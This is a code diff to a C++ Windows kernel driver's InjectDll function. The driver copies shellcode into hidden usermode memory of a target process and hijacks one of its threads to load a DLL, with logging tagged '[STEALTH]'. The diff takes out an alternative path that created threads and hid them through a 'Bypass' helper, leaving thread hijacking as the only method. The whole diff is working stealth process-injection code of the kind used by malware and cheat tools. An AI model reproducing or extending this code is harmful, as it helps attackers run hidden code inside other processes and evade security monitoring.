@@ -480,7 +480,7 @@ INJECT_STATUS InjectDll(
     NT_ASSERT(DllBuffer);
 
     NTSTATUS status;
-    STEALTH_INJECT_CONFIG defaultConfig = { TRUE, TRUE, 60000, nullptr };
+    STEALTH_INJECT_CONFIG defaultConfig = { TRUE, 60000, nullptr };  // WaitForCompletion, TimeoutMs, NotificationAddress
 
     if (!Config)
     {
@@ -581,13 +581,10 @@ INJECT_STATUS InjectDll(
     PVOID GetProcAddress = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "GetProcAddress");
     PVOID NtFlushInstructionCache = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "NtFlushInstructionCache");
     
-    // Required for non-hijack thread termination
-    PVOID RtlExitUserThread = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "RtlExitUserThread");
-    
     // Optional TLS support
     PVOID LdrpHandleTlsData = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "LdrpHandleTlsData");
 
-    if (!LoadLibraryA || !GetProcAddress || !RtlExitUserThread)
+    if (!LoadLibraryA || !GetProcAddress)
     {
         WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to find required exports!");
         return INJECT_STATUS::ModuleNotFound;
@@ -622,12 +619,9 @@ INJECT_STATUS InjectDll(
     hijackContext->pLoadLibraryA = reinterpret_cast<ULONG64>(LoadLibraryA);
     hijackContext->pGetProcAddress = reinterpret_cast<ULONG64>(GetProcAddress);
     hijackContext->pNtFlushInstructionCache = reinterpret_cast<ULONG64>(NtFlushInstructionCache);
-    hijackContext->pRtlExitUserThread = reinterpret_cast<ULONG64>(RtlExitUserThread);
     
     // Function pointers (optional)
     hijackContext->pLdrpHandleTlsData = reinterpret_cast<ULONG64>(LdrpHandleTlsData);
-    
-    // IsHijackedThread will be set later based on injection method
 
     // === Copy shellcode from kernel to usermode hidden memory ===
     SIZE_T shellcodeSize = StealthShellcode::GetShellcodeSize();
@@ -656,90 +650,34 @@ INJECT_STATUS InjectDll(
               "[STEALTH] TLS RVA: 0x%llX (0x%llX), LdrpHandleTlsData: 0x%p",
               hijackContext->TlsDirRva, hijackContext->TlsDirSize, LdrpHandleTlsData);
 
-    if (Config->UseThreadHijack)
+    // === Thread Hijack Injection ===
+    // Find a suitable thread to hijack
+    PETHREAD targetThread = nullptr;
+    status = FindHijackableThread(TargetProcess, &targetThread);
+    if (!NT_SUCCESS(status))
     {
-        // Mark as hijacked thread - shellcode will restore context and return
-        hijackContext->IsHijackedThread = 1;
-        
-        // Find a suitable thread to hijack
-        PETHREAD targetThread = nullptr;
-        status = FindHijackableThread(TargetProcess, &targetThread);
-        if (!NT_SUCCESS(status))
-        {
-            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "No suitable thread found: %!STATUS!", status);
-            return INJECT_STATUS::NoSuitableThread;
-        }
-
-        SCOPE_EXIT
-        {
-            if (targetThread)
-            {
-                ObDereferenceObject(targetThread);
-            }
-        };
-
-        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Hijacking thread TID %d",
-                  HandleToULong(PsGetThreadId(targetThread)));
-
-        // Hijack thread with our shellcode
-        status = HijackThreadAndExecute(targetThread, shellcodeBase, hijackContext,
-                                         Config->WaitForCompletion, Config->TimeoutMs);
-        if (!NT_SUCCESS(status))
-        {
-            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Thread hijack failed: %!STATUS!", status);
-            return INJECT_STATUS::ThreadHijackFailed;
-        }
+        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "No suitable thread found: %!STATUS!", status);
+        return INJECT_STATUS::NoSuitableThread;
     }
-    else
+
+    SCOPE_EXIT
     {
-        // Mark as new thread - shellcode will call RtlExitUserThread when done
-        hijackContext->IsHijackedThread = 0;
-        
-        // Create a new hidden thread with RtlCreateUserThread
-        HANDLE threadHandle = nullptr;
-        CLIENT_ID clientId = {};
-
-        status = RtlCreateUserThread(ZwCurrentProcess(), nullptr, FALSE, 0, 0, 0,
-                                      shellcodeBase, hijackContext, &threadHandle, &clientId);
-        if (!NT_SUCCESS(status))
+        if (targetThread)
         {
-            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to create thread: %!STATUS!", status);
-            return INJECT_STATUS::ThreadHijackFailed;
+            ObDereferenceObject(targetThread);
         }
+    };
 
-        // Mark thread as hidden
-        Bypass::CreateHiddenThread(currentProcessId, clientId.UniqueThread, FALSE);
+    WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Hijacking thread TID %d",
+              HandleToULong(PsGetThreadId(targetThread)));
 
-        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Created hidden thread TID %d",
-                  HandleToULong(clientId.UniqueThread));
-
-        if (Config->WaitForCompletion)
-        {
-            // Wait for our completion signal rather than thread termination
-            LARGE_INTEGER startTime;
-            KeQuerySystemTime(&startTime);
-
-            while (InterlockedCompareExchange(&hijackContext->Completed, 0, 0) == 0)
-            {
-                LARGE_INTEGER delay;
-                delay.QuadPart = RELATIVE(MILLISECONDS(10));
-                KeDelayExecutionThread(KernelMode, FALSE, &delay);
-
-                if (Config->TimeoutMs > 0)
-                {
-                    LARGE_INTEGER currentTime;
-                    KeQuerySystemTime(&currentTime);
-                    LONGLONG elapsed = (currentTime.QuadPart - startTime.QuadPart) / 10000;
-                    if (elapsed >= Config->TimeoutMs)
-                    {
-                        WPP_PRINT(TRACE_LEVEL_WARNING, GENERAL, "[STEALTH] Injection timed out");
-                        break;
-                    }
-                }
-            }
-        }
-
-        ZwClose(threadHandle);
+    // Hijack thread with our shellcode
+    status = HijackThreadAndExecute(targetThread, shellcodeBase, hijackContext,
+                                     Config->WaitForCompletion, Config->TimeoutMs);
+    if (!NT_SUCCESS(status))
+    {
+        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Thread hijack failed: %!STATUS!", status);
+        return INJECT_STATUS::ThreadHijackFailed;
     }
 
     // Check result
